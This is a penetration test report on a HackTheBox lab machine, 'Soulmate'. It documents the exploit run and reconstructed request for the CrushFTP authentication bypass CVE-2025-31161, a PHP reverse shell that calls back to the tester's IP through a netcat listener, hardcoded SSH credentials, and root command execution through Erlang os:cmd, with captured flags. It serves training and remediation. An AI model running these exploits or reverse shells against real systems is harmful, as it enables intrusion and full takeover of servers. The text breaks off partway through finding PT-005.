# PENETRATION TESTING REPORT

## Soulmate - HackTheBox Lab Assessment

**Engagement Type:** External Network Penetration Test with Post-Exploitation Analysis  
**Environment:** HackTheBox Lab Environment (Simulated Production)  
**Classification:** Educational/Training Assessment

## DATE_OF_TEST_EVENT

**Testing Period:** January 19, 2026 (09:30 - 16:30 EST)  
**Timezone Reference:** Eastern Standard Time (UTC-5)

## TABLE_OF_CONTENTS

1. [Document Revision History](#document-revision-history)
2. [Statement of Confidentiality](#statement-of-confidentiality)
3. [Engagement Contacts](#engagement-contacts)
4. [Executive Summary](#executive-summary)
5. [Network Penetration Test Assessment Summary](#network-penetration-test-assessment-summary)
6. [Findings](#findings)
   - [PT-001: CrushFTP Authentication Bypass (CVE-2025-31161)](#finding-id-pt-001)
   - [PT-002: Arbitrary File Upload Leading to Remote Code Execution](#finding-id-pt-002)
   - [PT-003: Hardcoded Credentials in Erlang SSH Configuration](#finding-id-pt-003)
   - [PT-004: Erlang/OTP SSH Service Running as Root](#finding-id-pt-004)
   - [PT-005: Missing Security Headers and Cookie Flags](#finding-id-pt-005)
   - [PT-006: Outdated Software Versions](#finding-id-pt-006)
   - [PT-007: WebDAV Enabled with Dangerous HTTP Methods](#finding-id-pt-007)
7. [Internal Network Compromise Walkthrough](#internal-network-compromise-walkthrough)
8. [Remediation Summary](#remediation-summary)
9. [Appendices](#appendices)

## Document Revision History

| Author | Date | Version | Comment |
| ------ | ---- | ------- | ------- |
| Security Analyst | 2026-01-19 | 1.0 | Initial draft - Report generated from assessment logs |

## STATEMENT OF CONFIDENTIALITY

This document contains sensitive security information, including system architecture details, vulnerabilities, and exploitation techniques. Distribution is restricted to authorized personnel only.

**Note:** This assessment was conducted against a HackTheBox lab environment for educational and training purposes. All findings and exploitation activities were performed within the authorized scope of the lab challenge.

## ENGAGEMENT CONTACTS

| Contact | Title | Phone | Email |
| ------- | ----- | ----- | ----- |
| HackTheBox | Lab Provider | N/A | support@hackthebox.com |
| Tester | Penetration Tester | N/A | N/A |

## EXECUTIVE SUMMARY

*[Source: Expert Analysis based on executed log files]*

This section provides a high-level, non-technical overview of the penetration testing engagement conducted against the "Soulmate" target system within the HackTheBox lab environment.

### Assessment Overview

The assessment evaluated the security posture of a Linux-based web server hosting multiple web applications. Testing was conducted from an external attacker perspective with no prior credentials or internal network access.

### Key Findings Summary

The assessment identified **7 distinct security vulnerabilities** ranging from **Critical** to **Low** severity:

| Severity | Count | Description |
|----------|-------|-------------|
| **Critical** | 2 | Authentication bypass, Remote code execution |
| **High** | 2 | Hardcoded credentials, Privileged service misconfiguration |
| **Medium** | 2 | WebDAV misconfigurations, Outdated software |
| **Low** | 1 | Missing security headers |

### Attack Path Summary

*[Source: Analysis of ssh.log, tasks.md, backgrounder.log]*

A complete system compromise was achieved through the following attack chain:

1. **Initial Access:** Exploitation of CVE-2025-31161 (CrushFTP Authentication Bypass) to create unauthorized administrative account
2. **Lateral Movement:** Password modification of existing user "ben" through CrushFTP admin interface
3. **Code Execution:** PHP reverse shell upload via CrushFTP file manager to web-accessible directory
4. **Credential Discovery:** Hardcoded SSH credentials found in Erlang configuration file via LinPEAS enumeration
5. **Privilege Escalation:** Exploitation of Erlang/OTP SSH service running as root on port 2222

### Overall Risk Assessment

*[Source: Expert Interpretation]*

**CRITICAL RISK** - The combination of a publicly exploitable authentication bypass vulnerability and multiple privilege escalation paths results in complete system compromise with minimal attacker effort. The presence of hardcoded credentials and services running with excessive privileges demonstrates systemic security weaknesses that would likely exist in similar production environments.

### SCENARIOS INCLUDED

*[Source: backgrounder.log, tasks.md]*

* **External Network Penetration Test** – Assessment of externally exposed services (SSH, HTTP/NGINX) from an unauthenticated attacker perspective
* **Web Application Testing** – Evaluation of CrushFTP web interface and primary dating application (soulmate.htb)
* **Post-Exploitation Analysis** – Enumeration and privilege escalation from initial foothold

### APPROACH

*[Source: Expert/Industry Best Practice]*

The assessment followed the PTES (Penetration Testing Execution Standard) methodology:

1. **Intelligence Gathering** - Automated nmap scans, curl header enumeration, web reconnaissance
2. **Vulnerability Analysis** - Service version identification, CVE research, manual validation
3. **Exploitation** - Proof-of-concept execution, shell establishment
4. **Post-Exploitation** - Privilege enumeration (LinPEAS, LinEnum), credential harvesting, lateral movement
5. **Reporting** - Documentation of findings with evidence

### SCOPE AND DURATION

*[Source: tasks.md, backgrounder.log]*

| Host/IP/URL | Duration | Description |
| ----------- | -------- | ----------- |
| 10.129.231.23 | Full engagement | Target IP address |
| soulmate.htb | Full engagement | Primary web application (dating site) |
| ftp.soulmate.htb | Full engagement | CrushFTP web interface (virtual host) |
| Attack Host: 10.10.14.114 | N/A | Tester's system |

### ASSESSMENT OVERVIEW AND RECOMMENDATIONS

*[Source: Expert Interpretation]*

The assessment revealed critical security deficiencies:

1. **Unpatched Third-Party Software** - CrushFTP version 11.W.657-2025_03_08 vulnerable to CVE-2025-31161
2. **Insufficient Access Controls** - Administrative functions accessible after authentication bypass
3. **Credential Management Failures** - Hardcoded passwords in configuration files
4. **Excessive Service Privileges** - Erlang SSH daemon running as root
5. **Weak Web Security Posture** - Missing security headers, insecure cookie configurations

**Priority Recommendations:**
- Immediately patch or disable CrushFTP until CVE-2025-31161 is addressed
- Implement principle of least privilege for all services
- Remove hardcoded credentials and implement secure credential management
- Deploy web application firewall (WAF) and security headers

---

## NETWORK PENETRATION TEST ASSESSMENT SUMMARY

*[Source: Analysis of nmap scan logs in scans/nmap_scan_20260119_094640/, backgrounder.log]*

### Target Infrastructure

| Component | Details |
|-----------|---------|
| **IP Address** | 10.129.231.23 |
| **Operating System** | Ubuntu 22.04.5 LTS (Jammy Jellyfish) |
| **Kernel** | Linux 5.15.0-153-generic |
| **Architecture** | x86_64 |
| **Virtualization** | VMware |

### Open Ports and Services

*[Source: scans/namp_baseline/10.129.231.23_vuln_scan.nmap, backgrounder.log]*

| Port | Protocol | Service | Version | Notes |
|------|----------|---------|---------|-------|
| 22/tcp | SSH | OpenSSH | 8.9p1 Ubuntu 3ubuntu0.13 | Multiple known CVEs identified |
| 80/tcp | HTTP | nginx | 1.18.0 (Ubuntu) | Hosts soulmate.htb and ftp.soulmate.htb |
| 4369/tcp | EPMD | Erlang Port Mapper | - | Erlang distributed computing |

### Virtual Hosts Discovered

*[Source: backgrounder.log, gobuster vhost discovery]*

| Virtual Host | Service | Application |
|--------------|---------|-------------|
| soulmate.htb | nginx proxy | PHP-based dating application |
| ftp.soulmate.htb | nginx proxy → 127.0.0.1:9090 | CrushFTP 11.W.657 (Web Interface) |

### Internal Listening Services

*[Source: evidence/linpeas.log, logs/ssh.log]*

| Port | Binding | Service |
|------|---------|---------|
| 127.0.0.1:2222 | Localhost | Erlang/OTP SSH (running as root) |
| 127.0.0.1:8080 | Localhost | Docker proxy (CrushFTP container) |
| 127.0.0.1:9090 | Localhost | CrushFTP web interface |
| 127.0.0.1:8443 | Localhost | CrushFTP HTTPS |
| 0.0.0.0:4369 | All interfaces | EPMD (Erlang Port Mapper) |

### SUMMARY OF FINDINGS

*[Source: Expert Analysis of all log files]*

* Critical authentication bypass vulnerability in CrushFTP allowing unauthenticated account creation
* Unrestricted file upload functionality enabling web shell deployment
* Hardcoded credentials discovered in Erlang SSH configuration
* Erlang SSH service running with root privileges on localhost
* Multiple security header deficiencies across both web applications
* Outdated software versions with known vulnerabilities
* WebDAV enabled with dangerous HTTP methods

---

## FINDING ID: PT-001

**Finding Title:** CrushFTP Authentication Bypass (CVE-2025-31161)

**Severity:** Critical  
**Risk Rating:** CVSS v3.1: 9.8 – Critical  
**Mapped Controls:**
- NIST 800-53: AC-2 (Account Management), IA-2 (Identification and Authentication)
- CWE-287: Improper Authentication
- OWASP Top 10 2021: A07 Identification and Authentication Failures

**Impact:** Complete authentication bypass enabling unauthorized administrative access and arbitrary user creation.

---

### SUMMARY

*[Source: tasks.md, scripts/CVE-2025-31161/cve-2025-31161.py]*

CrushFTP version 11.W.657 is vulnerable to an authentication bypass vulnerability (CVE-2025-31161) that allows unauthenticated attackers to create new user accounts with arbitrary privileges, including administrative access. This vulnerability was actively exploited during the assessment to gain initial access to the system.

---

### AFFECTED ASSETS

| Asset | IP / Hostname | Role | Environment |
| ----- | ------------- | ---- | ----------- |
| CrushFTP | ftp.soulmate.htb (10.129.231.23) | File Transfer Service | Production (Docker Container) |

---

### VULNERABILITY TYPE

* **Category:** Authentication Bypass
* **Associated Weakness:** CWE-287: Improper Authentication

---

### DESCRIPTION

*[Source: Expert Analysis, CVE Research, scripts/CVE-2025-31161/cve-2025-31161.py]*

The CrushFTP application fails to properly validate authentication tokens in the `setUserItem` API endpoint. By crafting a malicious request with a specifically formatted `Authorization` header (`AWS4-HMAC-SHA256 Credential=crushadmin/`), an attacker can bypass authentication and execute privileged operations.

The vulnerability exists because:
1. The application accepts incomplete AWS-style authorization headers
2. Token validation logic contains a race condition that can be exploited
3. The `c2f` (CSRF) token validation can be bypassed with known values

**Prerequisite Conditions:**
- Network access to CrushFTP web interface (port 80 via nginx proxy)
- No authentication required

---

### ATTACK VECTOR

*[Source: Expert Analysis, Industry Research]*

**Network Access Requirements:** Remote, unauthenticated  
**Authentication Requirements:** None  
**User Interaction:** None  
**Attack Complexity:** Low

The attack can be executed remotely without any user interaction or prior authentication.

---

### PROOF OF CONCEPT / EVIDENCE

*[Source: tasks.md, scripts/CVE-2025-31161/cve-2025-31161.py execution log]*

**Exploit Execution:**
```text
┌──(kali㉿kali)-[/mnt/htba/cases/htb/Soulmate/scripts/CVE-2025-31161]
└─ [2026-01-19 10:27:47] $ python3 cve-2025-31161.py --target_host ftp.soulmate.htb --port 80 --target_user root --new_user test --password test123
[+] Preparing Payloads
[-] Warming up the target
[+] Sending Account Create Request
[!] User created successfully
[+] Exploit Complete you can now login with
[*] Username: test
[*] Password: test123.
```

**HTTP Request (Reconstructed from exploit code):**
```http
POST /WebInterface/function/ HTTP/1.1
Host: ftp.soulmate.htb
Cookie: currentAuth=31If; CrushAuth=1744110584619_p38s3LvsGAfk4GvVu0vWtsEQEv31If
Authorization: AWS4-HMAC-SHA256 Credential=crushadmin/
Content-Type: application/x-www-form-urlencoded

command=setUserItem&data_action=replace&serverGroup=MainUsers&username=test&user=<XML_PAYLOAD>&c2f=31If
```

---

### EXPLOITATION DETAILS

*[Source: tasks.md]*

**Steps Taken:**
1. Cloned CVE-2025-31161 exploit from https://github.com/Immersive-Labs-Sec/CVE-2025-31161
2. Executed exploit script targeting ftp.soulmate.htb on port 80
3. Created new user "test" with password "test123"
4. Successfully authenticated to CrushFTP web interface with created account
5. Accessed administrative functions via "admin" button
6. Modified existing user "ben" password through User Manager interface
7. Logged in as "ben" to access user files and upload capabilities

**Level of Access Obtained:** Full administrative access to CrushFTP

---

### IMPACT

*[Source: Expert Analysis]*

* **Data Exposure Risk:** HIGH - Full access to all files managed by CrushFTP
* **Privilege Escalation Potential:** CRITICAL - Administrative access enables user creation/modification
* **Lateral Movement Capability:** HIGH - File access to webprod folder enabled web shell deployment
* **Service Availability Concerns:** HIGH - Ability to delete users, files, or reconfigure service

---

### LIKELIHOOD

*[Source: Expert Analysis, Industry Research]*

**HIGH** - Public exploit code is readily available. The vulnerability requires no authentication and can be exploited remotely with minimal skill level. Active exploitation in the wild has been reported.

---

### RISK JUSTIFICATION

*[Source: Expert Interpretation]*

The Critical severity rating is justified due to:
- Complete bypass of authentication controls
- Publicly available exploit code
- No user interaction required
- Direct path to administrative access
- Active exploitation documented by security researchers (Huntress, Immersive Labs)

---

### RECOMMENDATIONS

*[Source: Industry Best Practice, Vendor Advisory]*

**Immediate Mitigation:**
1. Upgrade CrushFTP to version 11.3.1 or later (patched version)
2. If patching is not immediately possible, disable the CrushFTP service
3. Review all CrushFTP user accounts for unauthorized entries
4. Audit file access logs for indicators of compromise

**Long-term Corrective Actions:**
1. Implement Web Application Firewall (WAF) rules to detect exploit attempts
2. Enable CrushFTP's built-in logging and forward to SIEM
3. Restrict access to administrative interface via network segmentation
4. Implement MFA for all administrative access

---

### VALIDATION / VERIFICATION STEPS

*[Source: Expert/Industry Best Practice]*

1. Verify CrushFTP version is 11.3.1 or later
2. Attempt to reproduce exploit; should receive authentication error
3. Review user database for any unauthorized accounts
4. Confirm all legitimate users have required password changes

---

### REFERENCES

* CVE-2025-31161 - https://nvd.nist.gov/vuln/detail/CVE-2025-31161
* CWE-287 - https://cwe.mitre.org/data/definitions/287.html
* Huntress Advisory - https://www.huntress.com/blog/crushftp-cve-2025-31161-auth-bypass-and-post-exploitation
* Exploit Code - https://github.com/Immersive-Labs-Sec/CVE-2025-31161

---

### STATUS

**Open** - Requires immediate remediation

---

### NOTES

*[Source: results.json analysis]*

CrushFTP version identified: 11.W.657-2025_03_08_07_52 (extracted from JavaScript file paths in results.json)

---

### RELATED FINDINGS

* PT-002: Arbitrary File Upload (enabled by administrative access obtained through this vulnerability)

---

## FINDING ID: PT-002

**Finding Title:** Arbitrary File Upload Leading to Remote Code Execution

**Severity:** Critical  
**Risk Rating:** CVSS v3.1: 9.1 – Critical  
**Mapped Controls:**
- NIST 800-53: SI-3 (Malicious Code Protection), CM-7 (Least Functionality)
- CWE-434: Unrestricted Upload of File with Dangerous Type
- OWASP Top 10 2021: A03 Injection

**Impact:** Remote code execution as www-data user through malicious PHP file upload.

---

### SUMMARY

*[Source: tasks.md, evidence/linpeas.log]*

The CrushFTP file manager functionality allows authenticated users to upload files to web-accessible directories. After obtaining administrative access through CVE-2025-31161, a PHP reverse shell was uploaded to the "webprod" folder, which was served by the nginx web server. Accessing this file resulted in remote code execution as the www-data user.

---

### AFFECTED ASSETS

| Asset | IP / Hostname | Role | Environment |
| ----- | ------------- | ---- | ----------- |
| CrushFTP/nginx | ftp.soulmate.htb / soulmate.htb | File Manager/Web Server | Production |
| Web Root | /var/www/soulmate.htb/public | Web content directory | Production |

---

### VULNERABILITY TYPE

* **Category:** Unrestricted File Upload, Remote Code Execution
* **Associated Weakness:** CWE-434: Unrestricted Upload of File with Dangerous Type

---

### DESCRIPTION

*[Source: tasks.md, evidence/linpeas.log process listing]*

The CrushFTP application provides file upload functionality through its web interface. User "ben" had write access to a "webprod" folder that was mapped to the nginx document root (`/var/www/soulmate.htb/public`). The nginx configuration does not block PHP execution in this directory, allowing uploaded PHP files to be executed.

**Attack Chain:**
1. Authenticated as user "ben" via CrushFTP (credentials obtained through PT-001)
2. Uploaded PHP reverse shell (php-reverse-shell.php) to webprod folder
3. Accessed uploaded file via HTTP to trigger PHP execution
4. Received reverse shell connection as www-data user

---

### ATTACK VECTOR

*[Source: Expert Analysis]*

**Network Access Requirements:** Remote, authenticated (credentials obtained via PT-001)  
**Authentication Requirements:** CrushFTP user credentials  
**User Interaction:** None after authentication

---

### PROOF OF CONCEPT / EVIDENCE

*[Source: evidence/linpeas.log - Process listing]*

```text
╔══════════╣ Opened Files by processes
Process 2840 (www-data) - sh -c uname -a; w; id; /bin/sh -i
  └─ Has open files:
    └─ pipe:[240030]
    └─ pipe:[240031]
    └─ pipe:[240032]
    └─ /var/www/soulmate.htb/public/php-reverse-shell.php (deleted)
Process 2844 (www-data) - /bin/sh -i
  └─ Has open files:
    └─ /var/www/soulmate.htb/public/php-reverse-shell.php (deleted)
Process 2851 (www-data) - python3 -c import pty; pty.spawn("/bin/bash")
  └─ Has open files:
    └─ /var/www/soulmate.htb/public/php-reverse-shell.php (deleted)
```

**nginx Configuration Allowing PHP Execution:**
*[Source: evidence/linpeas.log]*
```nginx
server {
    listen 80;
    server_name soulmate.htb;
    root /var/www/soulmate.htb/public;
    index index.php;
    location ~ \.php$ {
        include snippets/fastcgi-php.conf;
        fastcgi_pass unix:/run/php/php8.1-fpm.sock;
        fastcgi_param SCRIPT_FILENAME $document_root$fastcgi_script_name;
    }
}
```

---

### EXPLOITATION DETAILS

*[Source: tasks.md, scripts/php-reverse-shell/ directory]*

**Tools Used:**
- PentestMonkey PHP Reverse Shell (https://github.com/pentestmonkey/php-reverse-shell)

**Steps Taken:**
1. Logged into CrushFTP as user "ben"
2. Navigated to webprod folder via file manager
3. Uploaded php-reverse-shell.php with attacker IP (10.10.14.114) configured
4. Started netcat listener on attack machine
5. Accessed http://soulmate.htb/php-reverse-shell.php
6. Received reverse shell as www-data user
7. Upgraded shell using Python PTY spawn

**Level of Access Obtained:** Shell access as www-data (UID 33)

---

### IMPACT

*[Source: Expert Analysis]*

* **Data Exposure Risk:** MEDIUM - www-data can read web application files
* **Privilege Escalation Potential:** HIGH - Foothold enables further enumeration (led to PT-003, PT-004)
* **Lateral Movement Capability:** HIGH - Can access local services and enumerate internal network
* **Service Availability Concerns:** MEDIUM - Could modify web content or disrupt service

---

### LIKELIHOOD

*[Source: Expert Analysis]*

**HIGH** (when chained with PT-001) - The vulnerability is trivially exploited once CrushFTP access is obtained. Pre-built PHP shells are widely available.

---

### RISK JUSTIFICATION

*[Source: Expert Interpretation]*

The Critical severity rating is justified due to:
- Direct path to remote code execution
- Trivial exploitation with readily available tools
- No additional barriers once CrushFTP access is obtained
- Gateway vulnerability enabling further compromise (PT-003, PT-004)

---

### RECOMMENDATIONS

*[Source: Industry Best Practice]*

**Immediate Mitigation:**
1. Review and remove any unauthorized files in web directories
2. Disable PHP execution in upload directories via nginx configuration:
```nginx
location ~* ^/uploads/.*\.php$ {
    deny all;
}
```
3. Implement file type validation on CrushFTP upload functionality

**Long-term Corrective Actions:**
1. Separate file upload directories from web-accessible paths
2. Implement antivirus/malware scanning on uploaded files
3. Use randomized filenames for uploads
4. Configure Content-Security-Policy to prevent script execution
5. Deploy application-level file type verification (magic bytes, not extension)

---

### VALIDATION / VERIFICATION STEPS

*[Source: Expert/Industry Best Practice]*

1. Attempt to upload .php file through CrushFTP
2. Verify file is not accessible or executable via web
3. Confirm nginx configuration blocks PHP in upload directories
4. Test file type validation by renaming shell to alternate extensions

---

### REFERENCES

* CWE-434 - https://cwe.mitre.org/data/definitions/434.html
* OWASP File Upload Cheat Sheet - https://cheatsheetseries.owasp.org/cheatsheets/File_Upload_Cheat_Sheet.html
* PHP Reverse Shell - https://github.com/pentestmonkey/php-reverse-shell

---

### STATUS

**Open** - Requires immediate remediation

---

### RELATED FINDINGS

* PT-001: CrushFTP Authentication Bypass (prerequisite for this exploitation)
* PT-003: Hardcoded Credentials (discovered via shell access)
* PT-004: Erlang SSH as Root (exploited via shell access)

---

## FINDING ID: PT-003

**Finding Title:** Hardcoded Credentials in Erlang SSH Configuration

**Severity:** High  
**Risk Rating:** CVSS v3.1: 7.5 – High  
**Mapped Controls:**
- NIST 800-53: IA-5 (Authenticator Management), SC-28 (Protection of Information at Rest)
- CWE-798: Use of Hard-coded Credentials
- OWASP Top 10 2021: A07 Identification and Authentication Failures

**Impact:** Credential disclosure enabling lateral movement and privilege escalation.

---

### SUMMARY

*[Source: tasks.md, evidence/linpeas.log]*

Post-exploitation enumeration using LinPEAS revealed an Erlang SSH service configuration file containing hardcoded plaintext credentials. The file `/usr/local/lib/erlang_login/start.escript` contained username "ben" with password "HouseH0ldings998", which enabled SSH access to the system.

---

### AFFECTED ASSETS

| Asset | IP / Hostname | Role | Environment |
| ----- | ------------- | ---- | ----------- |
| Erlang SSH Config | /usr/local/lib/erlang_login/start.escript | Configuration File | Production |

---

### VULNERABILITY TYPE

* **Category:** Hardcoded Credentials, Information Disclosure
* **Associated Weakness:** CWE-798: Use of Hard-coded Credentials

---

### DESCRIPTION

*[Source: tasks.md]*

The Erlang SSH service configuration script contains hardcoded authentication credentials in plaintext:

```erlang
{auth_methods, "publickey,password"},
{user_passwords, [{"ben", "HouseH0ldings998"}]},
```

These credentials are for the system user "ben" who has a valid shell (`/bin/bash`) and home directory (`/home/ben`). The file is readable by the www-data user, allowing any attacker with web shell access to extract these credentials.

**Root Cause:**
- Configuration management failure - credentials should be stored in secure vault or environment variables
- Insufficient file permissions - configuration readable by web service account

---

### ATTACK VECTOR

*[Source: Expert Analysis]*

**Network Access Requirements:** Local (requires initial foothold)  
**Authentication Requirements:** Shell access as www-data (obtained via PT-002)  
**User Interaction:** None

---

### PROOF OF CONCEPT / EVIDENCE

*[Source: tasks.md, logs/ssh.log]*

**Credential Discovery (from task notes):**
```text
linpeas.log showed odd script running as root: 
    root 1100 0.0 1.6 2251660 67536 ? Ssl 13:50 0:04 /usr/local/lib/erlang_login/start.escript ...

reviewed script which contained hard coded credentials: 
    {auth_methods, "publickey,password"},
    {user_passwords, [{"ben", "HouseH0ldings998"}]},
```

**Successful SSH Authentication:**
*[Source: logs/ssh.log]*
```text
┌──(kali㉿kali)-[/mnt/htba/cases/htb/Soulmate/scripts/CVE-2025-31161]
└─ [2026-01-19 10:59:16] $ ssh ben@ftp.soulmate.htb
ben@ftp.soulmate.htb's password: 
Last login: Mon Jan 19 16:05:48 2026 from 10.10.14.114
ben@soulmate:~$ cat user.txt 
4dfab376cb5ba4ac88d9ecc5a62f243b
```

---

### EXPLOITATION DETAILS

*[Source: tasks.md, logs/ssh.log]*

**Steps Taken:**
1. Executed LinPEAS enumeration script on compromised system
2. Identified suspicious Erlang process running as root
3. Examined Erlang configuration script at /usr/local/lib/erlang_login/start.escript
4. Extracted hardcoded credentials for user "ben"
5. Successfully authenticated via SSH to port 22 using discovered credentials
6. Captured user flag from /home/ben/user.txt

**Level of Access Obtained:** Interactive SSH session as user "ben"

---

### IMPACT

*[Source: Expert Analysis]*

* **Data Exposure Risk:** HIGH - User-level access to system files
* **Privilege Escalation Potential:** HIGH - Led to discovery of Erlang SSH on port 2222 (PT-004)
* **Lateral Movement Capability:** MEDIUM - Could potentially authenticate to other systems if password reuse exists
* **Service Availability Concerns:** LOW - Standard user privileges

---

### LIKELIHOOD

*[Source: Expert Analysis]*

**HIGH** - Any attacker with local file read access can discover these credentials. No special tools or skills required beyond basic enumeration.

---

### RISK JUSTIFICATION

*[Source: Expert Interpretation]*

The High severity rating is justified due to:
- Plaintext credential storage in accessible configuration file
- Credentials are for a real system user with shell access
- Low complexity to extract and use credentials
- Enabled further privilege escalation

---

### RECOMMENDATIONS

*[Source: Industry Best Practice]*

**Immediate Mitigation:**
1. Rotate password for user "ben" immediately
2. Audit all authentication to/from "ben" account
3. Remove hardcoded credentials from Erlang configuration

**Long-term Corrective Actions:**
1. Implement secrets management solution (HashiCorp Vault, AWS Secrets Manager)
2. Use environment variables or secure credential stores for service authentication
3. Implement principle of least privilege - restrict file permissions on configuration files
4. Deploy file integrity monitoring on sensitive configuration files
5. Conduct credential audit across all configuration files

---

### VALIDATION / VERIFICATION STEPS

*[Source: Expert/Industry Best Practice]*

1. Verify Erlang configuration no longer contains plaintext passwords
2. Confirm "ben" password has been changed
3. Test that Erlang SSH service still functions with secure authentication mechanism
4. Verify configuration file permissions restrict read access

---

### REFERENCES

* CWE-798 - https://cwe.mitre.org/data/definitions/798.html
* OWASP Secrets Management Cheat Sheet - https://cheatsheetseries.owasp.org/cheatsheets/Secrets_Management_Cheat_Sheet.html

---

### STATUS

**Open** - Requires immediate credential rotation and configuration remediation

---

### RELATED FINDINGS

* PT-002: File Upload RCE (prerequisite - enabled local enumeration)
* PT-004: Erlang SSH as Root (final escalation path using similar credentials)

---

## FINDING ID: PT-004

**Finding Title:** Erlang/OTP SSH Service Running as Root

**Severity:** High  
**Risk Rating:** CVSS v3.1: 8.8 – High  
**Mapped Controls:**
- NIST 800-53: AC-6 (Least Privilege), CM-7 (Least Functionality)
- CWE-250: Execution with Unnecessary Privileges

**Impact:** Complete system compromise through root-level code execution via Erlang shell.

---

### SUMMARY

*[Source: tasks.md, logs/ssh.log, evidence/linpeas.log]*

An Erlang/OTP SSH service is running on localhost port 2222 with root privileges. The service accepts the same credentials as discovered in PT-003. Upon successful authentication, users are dropped into an Erlang shell (Eshell) which can execute arbitrary operating system commands as root using the `os:cmd/1` function.

---

### AFFECTED ASSETS

| Asset | IP / Hostname | Role | Environment |
| ----- | ------------- | ---- | ----------- |
| Erlang SSH Service | 127.0.0.1:2222 | Erlang Interactive Shell | Production |

---

### VULNERABILITY TYPE

* **Category:** Excessive Privileges, Service Misconfiguration
* **Associated Weakness:** CWE-250: Execution with Unnecessary Privileges

---

### DESCRIPTION

*[Source: evidence/linpeas.log, tasks.md]*

**Process Information:**
```text
root 1100 0.0 1.6 2251660 67536 ? Ssl 13:50 0:04 /usr/local/lib/erlang_login/start.escript -B -- -root /usr/local/lib/erlang -bindir /usr/local/lib/erlang/erts-15.2.5/bin -progname erl -- -home /root -- -noshell -boot no_dot_erlang -sname ssh_runner -run escript start -- -- -kernel inet_dist_use_interface {127,0,0,1} -- -extra /usr/local/lib/erlang_login/start.escript
```

**Service Configuration:**
- Listening on 127.0.0.1:2222 (localhost only)
- Running as root (UID 0)
- Erlang/OTP version 15.2.5
- Password authentication enabled using credentials from PT-003

The Erlang shell provides direct access to OS command execution through the `os:cmd/1` function, which executes commands with the privileges of the running process (root).

---

### ATTACK VECTOR

*[Source: Expert Analysis]*

**Network Access Requirements:** Local (requires SSH access to system)  
**Authentication Requirements:** Valid credentials (discovered via PT-003)  
**User Interaction:** None

---

### PROOF OF CONCEPT / EVIDENCE

*[Source: logs/ssh.log]*

**SSH Connection and Root Command Execution:**
```text
ben@soulmate:~$ netstat -pano | grep " LISTEN "
tcp        0      0 127.0.0.1:2222          0.0.0.0:*               LISTEN      -

ben@soulmate:~$ ssh ben@localhost -p 2222
The authenticity of host '[localhost]:2222 ([127.0.0.1]:2222)' can't be established.
ED25519 key fingerprint is SHA256:TgNhCKF6jUX7MG8TC01/MUj/+u0EBasUVsdSQMHdyfY.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '[localhost]:2222' (ED25519) to the list of known hosts.
ben@localhost's password: 
Eshell V15.2.5 (press Ctrl+G to abort, type help(). for help)
(ssh_runner@soulmate)1> os:cmd("id").
"uid=0(root) gid=0(root) groups=0(root)\n"
(ssh_runner@soulmate)3> os:cmd("cat /root/root.txt").
"38783fc88d6a9e8c3fa558c395959753\n"
```

---

### EXPLOITATION DETAILS

*[Source: tasks.md, logs/ssh.log]*

**Research Reference:**
- https://vuln.be/post/os-command-and-code-execution-in-erlang-and-elixir/

**Steps Taken:**
1. Discovered Erlang SSH service on port 2222 via netstat enumeration
2. Connected to localhost:2222 using "ben" credentials (from PT-003)
3. Entered Erlang interactive shell (Eshell)
4. Executed `os:cmd("id")` to confirm root privileges
5. Extracted root flag using `os:cmd("cat /root/root.txt")`

**Level of Access Obtained:** Root shell via Erlang command execution

**Root Flag Captured:** `38783fc88d6a9e8c3fa558c395959753`

---

### IMPACT

*[Source: Expert Analysis]*

* **Data Exposure Risk:** CRITICAL - Full root access to all system files
* **Privilege Escalation Potential:** COMPLETE - Already at highest privilege level
* **Lateral Movement Capability:** CRITICAL - Can access any credential, key, or configuration
* **Service Availability Concerns:** CRITICAL - Full control over system services

---

### LIKELIHOOD

*[Source: Expert Analysis]*

**MEDIUM** (requires local access) - Exploitation requires valid credentials and SSH access to the system. However, once an attacker has user-level access, exploitation is trivial.

---

### RISK JUSTIFICATION

*[Source: Expert Interpretation]*

The High severity rating is justified due to:
- Direct path to root privilege from user-level access
- No additional authentication barriers beyond user credentials
- Erlang shell provides full OS command execution capability
- Trivial exploitation once access conditions are met

---

### RECOMMENDATIONS

*[Source: Industry Best Practice, Expert Analysis]*

**Immediate Mitigation:**
1. Evaluate business need for Erlang SSH service - disable if not required
2. If required, implement separate service account (non-root) with minimal privileges
3. Implement IP-based access restrictions (firewall rules)
4. Change authentication to key-based only with strong key management

**Long-term Corrective Actions:**
1. Run Erlang services as dedicated unprivileged user
2. Implement containerization with rootless containers
3. Deploy mandatory access controls (SELinux/AppArmor) to restrict capabilities
4. Implement network segmentation to limit internal service access
5. Enable comprehensive logging for Erlang SSH connections

---

### VALIDATION / VERIFICATION STEPS

*[Source: Expert/Industry Best Practice]*

1. Verify Erlang SSH service runs as non-root user
2. Test that os:cmd/1 executes with limited privileges
3. Confirm access logging is enabled for all authentication attempts
4. Validate firewall rules restrict access appropriately

---

### REFERENCES

* CWE-250 - https://cwe.mitre.org/data/definitions/250.html
* Erlang OS Module - https://www.erlang.org/doc/man/os.html
* Erlang Security - https://vuln.be/post/os-command-and-code-execution-in-erlang-and-elixir/

---

### STATUS

**Open** - Requires immediate privilege reduction

---

### RELATED FINDINGS

* PT-003: Hardcoded Credentials (provides authentication credentials for this service)

---

## FINDING ID: PT-005

**Finding Title:** Missing Security Headers and Insecure Cookie Configuration

**Severity:** Low  
**Risk Rating:** CVSS v3.1: 3.1 – Low  
**Mapped Controls:**
- NIST 800-53: SC-8 (Transmission Confidentiality), SI-10 (Information Input Validation)
- CWE-16: Configuration
- OWASP Top 10 2021: A05 Security Misconfiguration

**Impact:** Increased susceptibility to client-side attacks including XSS, clickjacking, and session hijacking.

---

### SUMMARY

*[Source: scans/nmap_scan_20260119_095441/soulmate.htb_80_nikto.txt, scans/nmap_scan_20260119_100029/ftp.soulmate.htb_80_nikto.txt]*

Both web applications (soulmate.htb and ftp.soulmate.htb) are missing critical security headers and have insecure cookie configurations. These deficiencies increase the attack surface for client-side attacks.

---

### AFFECTED ASSETS

| Asset | IP / Hostname | Role | Environment |
| ----- | ------------- | ---- | ----------- |
| soulmate.htb | 10.129.231.23 | Dating Application | Production |
| ftp.soulmate.htb | 10.129.231.23 | CrushFTP Web Interface | Production |

---

### VULNERABILITY TYPE

* **Category:** Security Misconfiguration
* **Associated Weakness:** CWE-16: Configuration

---

### DESCRIPTION

*[Source: Nikto scan output files]*

**soulmate.htb:**
```text
+ /: The anti-clickjacking X-Frame-Options header is not present.
+ /: The X-Content-Type-Options header is not set.
+ /: Cookie PHPSESSID created without the httponly flag.
```

**ftp.soulmate.htb:**
```text
